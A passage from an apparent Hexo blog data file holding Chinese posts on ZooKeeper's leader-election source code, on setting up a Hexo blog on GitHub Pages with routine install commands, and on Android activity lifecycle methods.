class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>(n.electionEpoch == logicalclock)&#123;</span><br><span class=\"line\">    recvset.put(n.sid, <span class=\"keyword\">new</span> Vote(n.leader, n.zxid, n.electionEpoch, n.peerEpoch));</span><br><span class=\"line\">    <span class=\"comment\">// 如果推举的Leader是自己，把自己的状态改为LEADING</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(ooePredicate(recvset, outofelection, n)) &#123;</span><br><span class=\"line\">        self.setPeerState((n.leader == self.getId()) ?</span><br><span class=\"line\">        ServerState.LEADING: learningState());</span><br><span class=\"line\">    Vote endVote = <span class=\"keyword\">new</span> Vote(n.leader, n.zxid, n.electionEpoch, n.peerEpoch);</span><br><span class=\"line\">    leaveInstance(endVote);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> endVote;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">/*</span><br><span class=\"line\"> * 确定Leader之前要保证半数以上的节点已经成为follower</span><br><span class=\"line\"> * Before joining an established ensemble, verify</span><br><span class=\"line\"> * a majority is following the same leader.</span><br><span class=\"line\"> */</span></span><br><span class=\"line\">outofelection.put(n.sid, <span class=\"keyword\">new</span> Vote(n.version,</span><br><span class=\"line\">        n.leader,</span><br><span class=\"line\">        n.zxid,</span><br><span class=\"line\">        n.electionEpoch,</span><br><span class=\"line\">        n.peerEpoch,</span><br><span class=\"line\">        n.state));</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(ooePredicate(outofelection, outofelection, n)) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">synchronized</span>(<span class=\"keyword\">this</span>)&#123;</span><br><span class=\"line\">            logicalclock = n.electionEpoch;</span><br><span class=\"line\">            self.setPeerState((n.leader == self.getId()) ?</span><br><span class=\"line\">                ServerState.LEADING: learningState());</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        Vote endVote = <span class=\"keyword\">new</span> Vote(n.leader, n.zxid, n.electionEpoch, n.peerEpoch);</span><br><span class=\"line\">        leaveInstance(endVote);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> endVote;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>这里需要解释一下<code>ooePredicate</code><br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span><br><span class=\"line\"> * This predicate checks that a leader has been elected. It doesn't</span><br><span class=\"line\"> * make a lot of sense without context (check lookForLeader) and it</span><br><span class=\"line\"> * has been separated for testing purposes.</span><br><span class=\"line\"> * 有两个map，一个表示收到的投票集合，一个表示LEADING状态节点和FOLLOWING节点的投票</span><br><span class=\"line\"> * 集合，这里要确定两个条件：一个是在收到的LOOKING节点中半数认为n节点应该是Leader</span><br><span class=\"line\"> * 另一个是LEADING节点必须告诉其他节点自己是LEADING状态，避免一直投票</span><br><span class=\"line\"> *</span><br><span class=\"line\"> * <span class=\"doctag\">@param</span> recv  map of received votes</span><br><span class=\"line\"> * <span class=\"doctag\">@param</span> ooe   map containing out of election votes (LEADING or FOLLOWING)</span><br><span class=\"line\"> * <span class=\"doctag\">@param</span> n     Notification</span><br><span class=\"line\"> * <span class=\"doctag\">@return</span></span><br><span class=\"line\"> */</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">protected</span> <span class=\"keyword\">boolean</span> <span class=\"title\">ooePredicate</span><span class=\"params\">(HashMap&lt;Long,Vote&gt; recv,</span><br><span class=\"line\">                                HashMap&lt;Long,Vote&gt; ooe,</span><br><span class=\"line\">                                Notification n)</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> (termPredicate(recv, <span class=\"keyword\">new</span> Vote(n.version,</span><br><span class=\"line\">                                         n.leader,</span><br><span class=\"line\">                                         n.zxid,</span><br><span class=\"line\">                                         n.electionEpoch,</span><br><span class=\"line\">                                         n.peerEpoch,</span><br><span class=\"line\">                                         n.state))</span><br><span class=\"line\">            &amp;&amp; checkLeader(ooe, n.leader, n.electionEpoch));</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>再来看一下<code>checkLeader</code><br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span><br><span class=\"line\">    * In the case there is a leader elected, and a quorum supporting</span><br><span class=\"line\">    * this leader, we have to check if the leader has voted and acked</span><br><span class=\"line\">    * that it is leading. We need this check to avoid that peers keep</span><br><span class=\"line\">    * electing over and over a peer that has crashed and it is no</span><br><span class=\"line\">    * longer leading.</span><br><span class=\"line\">    *</span><br><span class=\"line\">    * <span class=\"doctag\">@param</span> votes set of votes</span><br><span class=\"line\">    * <span class=\"doctag\">@param</span>   leader  leader id</span><br><span class=\"line\">    * <span class=\"doctag\">@param</span>   electionEpoch   epoch id</span><br><span class=\"line\">    */</span></span><br><span class=\"line\">   <span class=\"function\"><span class=\"keyword\">protected</span> <span class=\"keyword\">boolean</span> <span class=\"title\">checkLeader</span><span class=\"params\">(</span><br><span class=\"line\">           HashMap&lt;Long, Vote&gt; votes,</span><br><span class=\"line\">           <span class=\"keyword\">long</span> leader,</span><br><span class=\"line\">           <span class=\"keyword\">long</span> electionEpoch)</span></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">       <span class=\"keyword\">boolean</span> predicate = <span class=\"keyword\">true</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">       <span class=\"comment\">/*</span><br><span class=\"line\">        * If everyone else thinks I'm the leader, I must be the leader.</span><br><span class=\"line\">        * The other two checks are just for the case in which I'm not the</span><br><span class=\"line\">        * leader. If I'm not the leader and I haven't received a message</span><br><span class=\"line\">        * from leader stating that it is leading, then predicate is false.</span><br><span class=\"line\">        */</span></span><br><span class=\"line\"></span><br><span class=\"line\">       <span class=\"keyword\">if</span>(leader != self.getId())&#123;</span><br><span class=\"line\">           <span class=\"keyword\">if</span>(votes.get(leader) == <span class=\"keyword\">null</span>) predicate = <span class=\"keyword\">false</span>;</span><br><span class=\"line\">           <span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(votes.get(leader).getState() != ServerState.LEADING) predicate = <span class=\"keyword\">false</span>;</span><br><span class=\"line\">       &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(logicalclock != electionEpoch) &#123;</span><br><span class=\"line\">           predicate = <span class=\"keyword\">false</span>;</span><br><span class=\"line\">       &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">       <span class=\"keyword\">return</span> predicate;</span><br><span class=\"line\">   &#125;</span><br></pre></td></tr></table></figure></p>\n<p><code>FastLeaderElection</code>源码分析完了，总结一下：首先，每个节点先给自己投票，然后将投票信息发送给集群中的其他节点；每个节点收到其他节点的投票，放在<strong>投票队列</strong>中，从队列中提取投票，跟自己的投票比较，如果投票更合理，就替换自己的投票，否则不改变自己的投票。然后检测自己当前的投票是否相同于集群半数以上的节点，如果相同于半数以上投票，则判断这个投票是不是投的自己，如果是投的自己，则改变自己的状态为LEADING，否则改为FOLLOWING或者OBSERVER，最后返回最后的投票，并结束<code>LookForLeader</code>。</p>"},{"title":"搭建博客的大致流程","date":"2016-05-22T07:18:23.000Z","_content":"本想着是不是拿英文来写这个流程来锻炼一下自己的英文水平，不过想了想就不装B了，英语就拿磋样还拿出来献丑。言归正传，我以为可以在寝室大神的引导下我能快一点搭好my blog，不过是我想得太简单。经过自己踩了无数坑过后总结大概过程，具体过程网上一搜一大把，不过建议别用百度搜这种东西，能翻墙就翻墙吧。大概过程如下：\n\n<!--more-->\n\n### 安装前环境准备\ngit+node+hexo\n\n#### 安装git\n如果是windows，下个git bash，然后跟着网上的教程自己走一遍配置过程\n如果是linux,直接在终端输入代码\n\n``` bash\n$ sudo apt-get install git\n```\n\n如果不行可能是系统没有这个安装包吧，如果上面命令不能安装，自己想办法吧，比如好像可以从github上clone一个包来安装吧，这些可以自己摸索的，我当时就慢慢摸索下来的，相信你也可以。\n\n#### 安装sublime text\n说真的，这就是个编辑器，什么都可以写，可以安很多插件，可以拿它编代码，亲试还不错。不像其他编译器比如VS，eclipse那么复杂,语法高亮和语法提示，自动补全这些功能可以通过安插件实现。忘了说安装命令了\n\n``` bash\n$ sudo apt-get install sublime\n```\n\n如果安不了问google或baidu,因为我也忘了是不是这个了，反正我安的时候试了类似的命令就ok了。\n\n#### Github\n如果你是技术屌丝，这个可以有，而且有很多人在用。讲道理，这不是安装什么，就是去一个网站https://github.com注册一个账号，然后把Github Pages这个东西启用，具体过程google,baidu一大把，累了不想写\n\n然后windows用git bash，linux用终端设置你的用户名密码\n\n``` bash\n$ git config --global user.name \"your_name\"\n$ git config --global user.email \"your_email\"\n```\n\n#### 安装node\n这个没什么难的，不会自己多问，之间估计会遇到有node install, npm install什么的。\n\n#### 安装hexo\n说实话，这一步我走得很艰难，真的很艰难，到现在我都不想再去弄第二次。最开始我在虚拟机linux系统里面弄，没成功，直接导致我转向windows的git bash，具体怎么弄，请放过我，不过我可以回忆一下\n\n安装\n\n``` bash\n$ npm install -g hexo\n$ hexo --version\n```\n\n如果出现版本号，就恭喜你了，安好了。\n\n#### 初始化\n新建一个目录，然后cd到那个目录，然后初始化hexo到那个目录。\n\n``` bash\n$ mkdir hexo\n$ cd hexo\n$ hexo init\n```\n\n然后干嘛呢，我想想。。。。。。\n\n#### 生成静态页面\ncd到你init的目录(这是必须的，请注意)，执行下面的命令，生成静态页面\n\n``` bash\n$ hexo g\n```\n\n#### 在本地启动\n执行下面命令，然后打开浏览器输入http://localhost:4000进行预览\n\n``` bash\n$ hexo s\n```\n\n如果能行，就恭喜你了，要完了。。。。。。\n不过现在很晚了我要睡了，明天再更。。。。。。\n\n\n\n还没写完，继续吧，好像最后只有一步了，不知道昨天怎么没写完，最后只需要执行以下代码：\n\n``` bash\n$ hexo d\n```\n\n然后根据提示输入你的github的username和password就ok了，然后就去你自己的博客看看效果吧\n","source":"_posts/blog.md","raw":"---\ntitle: 搭建博客的大致流程\ntags: hexo搭建\ndate: 2016-05-22 15:18:23\ncategories: hexo\n---\n本想着是不是拿英文来写这个流程来锻炼一下自己的英文水平，不过想了想就不装B了，英语就拿磋样还拿出来献丑。言归正传，我以为可以在寝室大神的引导下我能快一点搭好my blog，不过是我想得太简单。经过自己踩了无数坑过后总结大概过程，具体过程网上一搜一大把，不过建议别用百度搜这种东西，能翻墙就翻墙吧。大概过程如下：\n\n<!--more-->\n\n### 安装前环境准备\ngit+node+hexo\n\n#### 安装git\n如果是windows，下个git bash，然后跟着网上的教程自己走一遍配置过程\n如果是linux,直接在终端输入代码\n\n``` bash\n$ sudo apt-get install git\n```\n\n如果不行可能是系统没有这个安装包吧，如果上面命令不能安装，自己想办法吧，比如好像可以从github上clone一个包来安装吧，这些可以自己摸索的，我当时就慢慢摸索下来的，相信你也可以。\n\n#### 安装sublime text\n说真的，这就是个编辑器，什么都可以写，可以安很多插件，可以拿它编代码，亲试还不错。不像其他编译器比如VS，eclipse那么复杂,语法高亮和语法提示，自动补全这些功能可以通过安插件实现。忘了说安装命令了\n\n``` bash\n$ sudo apt-get install sublime\n```\n\n如果安不了问google或baidu,因为我也忘了是不是这个了，反正我安的时候试了类似的命令就ok了。\n\n#### Github\n如果你是技术屌丝，这个可以有，而且有很多人在用。讲道理，这不是安装什么，就是去一个网站https://github.com注册一个账号，然后把Github Pages这个东西启用，具体过程google,baidu一大把，累了不想写\n\n然后windows用git bash，linux用终端设置你的用户名密码\n\n``` bash\n$ git config --global user.name \"your_name\"\n$ git config --global user.email \"your_email\"\n```\n\n#### 安装node\n这个没什么难的，不会自己多问，之间估计会遇到有node install, npm install什么的。\n\n#### 安装hexo\n说实话，这一步我走得很艰难，真的很艰难，到现在我都不想再去弄第二次。最开始我在虚拟机linux系统里面弄，没成功，直接导致我转向windows的git bash，具体怎么弄，请放过我，不过我可以回忆一下\n\n安装\n\n``` bash\n$ npm install -g hexo\n$ hexo --version\n```\n\n如果出现版本号，就恭喜你了，安好了。\n\n#### 初始化\n新建一个目录，然后cd到那个目录，然后初始化hexo到那个目录。\n\n``` bash\n$ mkdir hexo\n$ cd hexo\n$ hexo init\n```\n\n然后干嘛呢，我想想。。。。。。\n\n#### 生成静态页面\ncd到你init的目录(这是必须的，请注意)，执行下面的命令，生成静态页面\n\n``` bash\n$ hexo g\n```\n\n#### 在本地启动\n执行下面命令，然后打开浏览器输入http://localhost:4000进行预览\n\n``` bash\n$ hexo s\n```\n\n如果能行，就恭喜你了，要完了。。。。。。\n不过现在很晚了我要睡了，明天再更。。。。。。\n\n\n\n还没写完，继续吧，好像最后只有一步了，不知道昨天怎么没写完，最后只需要执行以下代码：\n\n``` bash\n$ hexo d\n```\n\n然后根据提示输入你的github的username和password就ok了，然后就去你自己的博客看看效果吧\n","slug":"blog","published":1,"updated":"2017-11-28T03:02:50.909Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjgrjscy20016yp0lyts6u1ss","content":"<p>本想着是不是拿英文来写这个流程来锻炼一下自己的英文水平，不过想了想就不装B了，英语就拿磋样还拿出来献丑。言归正传，我以为可以在寝室大神的引导下我能快一点搭好my blog，不过是我想得太简单。经过自己踩了无数坑过后总结大概过程，具体过程网上一搜一大把，不过建议别用百度搜这种东西，能翻墙就翻墙吧。大概过程如下：</p>\n<a id=\"more\"></a>\n<h3 id=\"安装前环境准备\"><a href=\"#安装前环境准备\" class=\"headerlink\" title=\"安装前环境准备\"></a>安装前环境准备</h3><p>git+node+hexo</p>\n<h4 id=\"安装git\"><a href=\"#安装git\" class=\"headerlink\" title=\"安装git\"></a>安装git</h4><p>如果是windows，下个git bash，然后跟着网上的教程自己走一遍配置过程<br>如果是linux,直接在终端输入代码</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ sudo apt-get install git</span><br></pre></td></tr></table></figure>\n<p>如果不行可能是系统没有这个安装包吧，如果上面命令不能安装，自己想办法吧，比如好像可以从github上clone一个包来安装吧，这些可以自己摸索的，我当时就慢慢摸索下来的，相信你也可以。</p>\n<h4 id=\"安装sublime-text\"><a href=\"#安装sublime-text\" class=\"headerlink\" title=\"安装sublime text\"></a>安装sublime text</h4><p>说真的，这就是个编辑器，什么都可以写，可以安很多插件，可以拿它编代码，亲试还不错。不像其他编译器比如VS，eclipse那么复杂,语法高亮和语法提示，自动补全这些功能可以通过安插件实现。忘了说安装命令了</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ sudo apt-get install sublime</span><br></pre></td></tr></table></figure>\n<p>如果安不了问google或baidu,因为我也忘了是不是这个了，反正我安的时候试了类似的命令就ok了。</p>\n<h4 id=\"Github\"><a href=\"#Github\" class=\"headerlink\" title=\"Github\"></a>Github</h4><p>如果你是技术屌丝，这个可以有，而且有很多人在用。讲道理，这不是安装什么，就是去一个网站<a href=\"https://github.com注册一个账号，然后把Github\" target=\"_blank\" rel=\"external\">https://github.com注册一个账号，然后把Github</a> Pages这个东西启用，具体过程google,baidu一大把，累了不想写</p>\n<p>然后windows用git bash，linux用终端设置你的用户名密码</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ git config --global user.name <span class=\"string\">\"your_name\"</span></span><br><span class=\"line\">$ git config --global user.email <span class=\"string\">\"your_email\"</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"安装node\"><a href=\"#安装node\" class=\"headerlink\" title=\"安装node\"></a>安装node</h4><p>这个没什么难的，不会自己多问，之间估计会遇到有node install, npm install什么的。</p>\n<h4 id=\"安装hexo\"><a href=\"#安装hexo\" class=\"headerlink\" title=\"安装hexo\"></a>安装hexo</h4><p>说实话，这一步我走得很艰难，真的很艰难，到现在我都不想再去弄第二次。最开始我在虚拟机linux系统里面弄，没成功，直接导致我转向windows的git bash，具体怎么弄，请放过我，不过我可以回忆一下</p>\n<p>安装</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ npm install -g hexo</span><br><span class=\"line\">$ hexo --version</span><br></pre></td></tr></table></figure>\n<p>如果出现版本号，就恭喜你了，安好了。</p>\n<h4 id=\"初始化\"><a href=\"#初始化\" class=\"headerlink\" title=\"初始化\"></a>初始化</h4><p>新建一个目录，然后cd到那个目录，然后初始化hexo到那个目录。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ mkdir hexo</span><br><span class=\"line\">$ <span class=\"built_in\">cd</span> hexo</span><br><span class=\"line\">$ hexo init</span><br></pre></td></tr></table></figure>\n<p>然后干嘛呢，我想想。。。。。。</p>\n<h4 id=\"生成静态页面\"><a href=\"#生成静态页面\" class=\"headerlink\" title=\"生成静态页面\"></a>生成静态页面</h4><p>cd到你init的目录(这是必须的，请注意)，执行下面的命令，生成静态页面</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo g</span><br></pre></td></tr></table></figure>\n<h4 id=\"在本地启动\"><a href=\"#在本地启动\" class=\"headerlink\" title=\"在本地启动\"></a>在本地启动</h4><p>执行下面命令，然后打开浏览器输入<a href=\"http://localhost:4000进行预览\" target=\"_blank\" rel=\"external\">http://localhost:4000进行预览</a></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo s</span><br></pre></td></tr></table></figure>\n<p>如果能行，就恭喜你了，要完了。。。。。。<br>不过现在很晚了我要睡了，明天再更。。。。。。</p>\n<p>还没写完，继续吧，好像最后只有一步了，不知道昨天怎么没写完，最后只需要执行以下代码：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo d</span><br></pre></td></tr></table></figure>\n<p>然后根据提示输入你的github的username和password就ok了，然后就去你自己的博客看看效果吧</p>\n","excerpt":"<p>本想着是不是拿英文来写这个流程来锻炼一下自己的英文水平，不过想了想就不装B了，英语就拿磋样还拿出来献丑。言归正传，我以为可以在寝室大神的引导下我能快一点搭好my blog，不过是我想得太简单。经过自己踩了无数坑过后总结大概过程，具体过程网上一搜一大把，不过建议别用百度搜这种东西，能翻墙就翻墙吧。大概过程如下：</p>","more":"<h3 id=\"安装前环境准备\"><a href=\"#安装前环境准备\" class=\"headerlink\" title=\"安装前环境准备\"></a>安装前环境准备</h3><p>git+node+hexo</p>\n<h4 id=\"安装git\"><a href=\"#安装git\" class=\"headerlink\" title=\"安装git\"></a>安装git</h4><p>如果是windows，下个git bash，然后跟着网上的教程自己走一遍配置过程<br>如果是linux,直接在终端输入代码</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ sudo apt-get install git</span><br></pre></td></tr></table></figure>\n<p>如果不行可能是系统没有这个安装包吧，如果上面命令不能安装，自己想办法吧，比如好像可以从github上clone一个包来安装吧，这些可以自己摸索的，我当时就慢慢摸索下来的，相信你也可以。</p>\n<h4 id=\"安装sublime-text\"><a href=\"#安装sublime-text\" class=\"headerlink\" title=\"安装sublime text\"></a>安装sublime text</h4><p>说真的，这就是个编辑器，什么都可以写，可以安很多插件，可以拿它编代码，亲试还不错。不像其他编译器比如VS，eclipse那么复杂,语法高亮和语法提示，自动补全这些功能可以通过安插件实现。忘了说安装命令了</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ sudo apt-get install sublime</span><br></pre></td></tr></table></figure>\n<p>如果安不了问google或baidu,因为我也忘了是不是这个了，反正我安的时候试了类似的命令就ok了。</p>\n<h4 id=\"Github\"><a href=\"#Github\" class=\"headerlink\" title=\"Github\"></a>Github</h4><p>如果你是技术屌丝，这个可以有，而且有很多人在用。讲道理，这不是安装什么，就是去一个网站<a href=\"https://github.com注册一个账号，然后把Github\">https://github.com注册一个账号，然后把Github</a> Pages这个东西启用，具体过程google,baidu一大把，累了不想写</p>\n<p>然后windows用git bash，linux用终端设置你的用户名密码</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ git config --global user.name <span class=\"string\">\"your_name\"</span></span><br><span class=\"line\">$ git config --global user.email <span class=\"string\">\"your_email\"</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"安装node\"><a href=\"#安装node\" class=\"headerlink\" title=\"安装node\"></a>安装node</h4><p>这个没什么难的，不会自己多问，之间估计会遇到有node install, npm install什么的。</p>\n<h4 id=\"安装hexo\"><a href=\"#安装hexo\" class=\"headerlink\" title=\"安装hexo\"></a>安装hexo</h4><p>说实话，这一步我走得很艰难，真的很艰难，到现在我都不想再去弄第二次。最开始我在虚拟机linux系统里面弄，没成功，直接导致我转向windows的git bash，具体怎么弄，请放过我，不过我可以回忆一下</p>\n<p>安装</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ npm install -g hexo</span><br><span class=\"line\">$ hexo --version</span><br></pre></td></tr></table></figure>\n<p>如果出现版本号，就恭喜你了，安好了。</p>\n<h4 id=\"初始化\"><a href=\"#初始化\" class=\"headerlink\" title=\"初始化\"></a>初始化</h4><p>新建一个目录，然后cd到那个目录，然后初始化hexo到那个目录。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ mkdir hexo</span><br><span class=\"line\">$ <span class=\"built_in\">cd</span> hexo</span><br><span class=\"line\">$ hexo init</span><br></pre></td></tr></table></figure>\n<p>然后干嘛呢，我想想。。。。。。</p>\n<h4 id=\"生成静态页面\"><a href=\"#生成静态页面\" class=\"headerlink\" title=\"生成静态页面\"></a>生成静态页面</h4><p>cd到你init的目录(这是必须的，请注意)，执行下面的命令，生成静态页面</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo g</span><br></pre></td></tr></table></figure>\n<h4 id=\"在本地启动\"><a href=\"#在本地启动\" class=\"headerlink\" title=\"在本地启动\"></a>在本地启动</h4><p>执行下面命令，然后打开浏览器输入<a href=\"http://localhost:4000进行预览\">http://localhost:4000进行预览</a></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo s</span><br></pre></td></tr></table></figure>\n<p>如果能行，就恭喜你了，要完了。。。。。。<br>不过现在很晚了我要睡了，明天再更。。。。。。</p>\n<p>还没写完，继续吧，好像最后只有一步了，不知道昨天怎么没写完，最后只需要执行以下代码：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ hexo d</span><br></pre></td></tr></table></figure>\n<p>然后根据提示输入你的github的username和password就ok了，然后就去你自己的博客看看效果吧</p>"},{"title":"android生命周期函数记录","date":"2016-06-15T16:00:00.000Z","_content":"\n### 函数及解释如下\n``` bash\nonCreate    在activity对象被第一次创建时调用\nonStart     在activity变得可见时调用该函数\nonResume    在activity开始准备与用户交互时调用该方法\nonPause     当系统即将启动另外一个activity之前调用该方法\nonStop      当前activity变得不可见时调用该方法\nonDestroy   当前activity被销毁之前将会调用该方法\nonRestroy   当一个activity再次启动之前将会调用该方法\n```\n\n\n### 来张图片帮助理解\n\n<!--more-->\n![one](http://images2015.cnblogs.com/blog/342595/201511/342595-20151120164811546-1166196919.png)\n\n### 提供java源代码\n\n``` bash\n package com.example.activitytest;\n \n import android.app.Activity;\n import android.content.Intent;\n import android.os.Bundle;\n import android.util.Log;\n import android.view.View;\n import android.view.View.OnClickListener;\n import android.widget.Button;\n \n public class MainActivity extends Activity {\n   \n     private Button btn;\n     private static final String TAG = \"ActivityTest\";\n     @Override\n     protected void onCreate(Bundle savedInstanceState) {\n         super.onCreate(savedInstanceState);\n         Log.d(TAG, \"MainActivity onCreate\");\n         setContentView(R.layout.activity_main);\n         btn = (Button)findViewById(R.id.btn);\n         btn.setOnClickListener(new OnClickListener() {\n             \n             @Override\n             public void onClick(View v) {\n                    Intent intent = new Intent(MainActivity.this,SecondActivity.class);\n                    startActivity(intent);\n             }\n         });\n         \n     }\n     @Override\n     protected void onPause() {\n         Log.d(TAG, \"MainActivity onPause  \");\n         super.onPause();\n     }\n     @Override\n     protected void onResume() {\n         Log.d(TAG, \"MainActivity onResume  \");\n         super.onResume();\n     }\n     @Override\n     protected void onStart() {\n         super.onStart();\n         Log.d(TAG,\"MainActivity onStart  \");\n     }\n     @Override\n     protected void onStop() {\n         super.onStop();\n         Log.d(TAG, \"MainActivity onStop  \");\n     }\n     @Override\n     protected void onDestroy() {\n         super.onDestroy();\n         Log.d(TAG, \"MainActivity onDestroy  \");\n     }\n     @Override\n     protected void onRestart() {\n         super.onRestart();\n         Log.d(TAG, \"MainActivity onRestart  \");\n     }\n }\n```","source":"_posts/android-activity.md","raw":"---\ntitle: android生命周期函数记录\ntags: Android生命周期\ndate: 2016-06-16\ncategories: Android\n---\n\n### 函数及解释如下\n``` bash\nonCreate    在activity对象被第一次创建时调用\nonStart     在activity变得可见时调用该函数\nonResume    在activity开始准备与用户交互时调用该方法\nonPause     当系统即将启动另外一个activity之前调用该方法\nonStop      当前activity变得不可见时调用该方法\nonDestroy   当前activity被销毁之前将会调用该方法\nonRestroy   当一个activity再次启动之前将会调用该方法\n```\n\n\n### 来张图片帮助理解\n\n<!--more-->\n![one](http://images2015.cnblogs.com/blog/342595/201511/342595-20151120164811546-1166196919.png)\n\n### 提供java源代码\n\n``` bash\n package com.example.activitytest;\n \n import android.app.Activity;\n import android.content.Intent;\n import android.os.Bundle;\n import android.util.Log;\n import android.view.View;\n import android.view.View.OnClickListener;\n import android.widget.Button;\n \n public class MainActivity extends Activity {\n   \n     private Button btn;\n     private static final String TAG = \"ActivityTest\";\n     @Override\n     protected void onCreate(Bundle savedInstanceState) {\n         super.onCreate(savedInstanceState);\n         Log.d(TAG, \"MainActivity onCreate\");\n         setContentView(R.layout.activity_main);\n         btn = (Button)findViewById(R.id.btn);\n         btn.setOnClickListener(new OnClickListener() {\n             \n             @Override\n             public void onClick(View v) {\n                    Intent intent = new Intent(MainActivity.this,SecondActivity.class);\n                    startActivity(intent);\n             }\n         });\n         \n     }\n     @Override\n     protected void onPause() {\n         Log.d(TAG, \"MainActivity onPause  \");\n         super.onPause();\n     }\n     @Override\n     protected void onResume() {\n         Log.d(TAG, \"MainActivity onResume  \");\n         super.onResume();\n     }\n     @Override\n     protected 